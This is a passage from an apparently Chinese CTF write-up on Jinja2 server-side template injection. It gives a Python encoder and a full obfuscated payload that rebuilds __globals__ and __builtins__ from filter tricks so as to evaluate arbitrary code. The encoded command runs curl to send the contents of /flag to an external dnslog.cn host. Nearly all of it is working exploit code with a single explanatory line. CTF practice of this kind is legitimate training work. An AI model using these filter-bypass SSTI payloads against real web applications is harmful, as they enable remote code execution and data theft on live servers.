        return 'D'
    if x == 4:
        return 'E'
    if x == 5:
        return 'F'
    if x == 6:
        return 'G'
    if x == 7:
        return 'H'
    if x == 8:
        return 'I'
    if x == 9:
        return 'J'
    else:
        numBIn = bin(x)[2:][::-1]
        num = ''
        mi = 0
        for i in numBIn:
            num = num + getNum(int(i)) + '*(' + getNum(2) + '**' + getNum(mi) + ')+'
            mi = mi + 1
        return '(' + num[:-1] + ')'



s = "__import__('os').popen('curl `cat /flag`.f7l5jg.dnslog.cn').read()"
x = ''
for i in s:
    x = x + 'chr(' + str(getNum(ord(i))) + ')~'
print(x.replace('+', "%2b"))

# num = getNum(24)
# num = num.replace('+','%2b')
# print(num)
```

## 372

又过滤了count ,用length过滤器拼凑数字

payload:

```python
{%set B=(a,)|length%}
{%set A=B-B%}
{%set C=B%2bB%}
{%set D=C%2bB%}
{%set E=D%2bB%}
{%set F=E%2bB%}
{%set G=F%2bB%}
{%set H=G%2bB%}
{%set I=H%2bB%}
{%set J=I%2bB%}
{% set xhx = (({}|select()|string()|list()).pop((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bB*(C**E)))|string())%}
{% set ini = dict(in=ro,it=dd)|join()%}
{% set init = xhx~xhx~ini~xhx~xhx%}
{% set glob = dict(glo=ro,bals=dd)|join()%}
{% set globals = xhx~xhx~glob~xhx~xhx%}
{% set getit = dict(get=ro,item=dd)|join()%}
{% set getitem = xhx~xhx~getit~xhx~xhx%}
{% set bu = dict(buil=aa,tins=dd)|join() %}
{% set bul = xhx~xhx~bu~xhx~xhx %}
{% set x=(q|attr(init)|attr(globals)|attr(getitem))(bul)%}
{%set chr = x.chr%}

{%set cmda=chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bB*(C**E)%2bA*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bB*(C**E)%2bA*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bA*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bB*(C**E)%2bA*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bB*(C**E)%2bA*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((B*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)))~chr((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)))~chr((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)))~chr((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)))~chr((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((B*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bB*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((A*(C**A)%2bB*(C**B)%2bB*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((A*(C**A)%2bB*(C**B)%2bA*(C**C)%2bA*(C**D)%2bB*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bB*(C**C)%2bA*(C**D)%2bA*(C**E)%2bB*(C**F)%2bB*(C**G)))~chr((A*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))~chr((B*(C**A)%2bA*(C**B)%2bA*(C**C)%2bB*(C**D)%2bA*(C**E)%2bB*(C**F)))%}
{%if (x.eval(cmda))%}sssss{%endif%}
```

